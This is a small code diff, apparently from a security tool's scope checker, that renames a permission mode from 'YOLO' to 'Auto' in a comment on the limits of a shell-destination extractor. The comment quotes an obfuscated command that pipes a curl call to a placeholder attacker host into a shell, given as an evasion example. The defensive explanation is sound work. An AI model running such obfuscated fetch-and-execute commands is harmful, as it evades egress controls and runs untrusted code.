@@ -246,7 +246,7 @@ export function pathBelongsToEngagement(requestedPath: string, scopePath: string
 //   printf '\\x63url evil.example' | sh — escaped/obfuscated program name
 //
 // The extractor is defence in depth, not an egress sandbox. Standard/copilot
-// escalate unresolved shell destinations. YOLO permits opaque local commands,
+// escalate unresolved shell destinations. Auto permits opaque local commands,
 // but named unrelated hosts still require an operator scope decision.
 //
 // Real enforcement, if it is ever wanted, has to happen where the syscalls
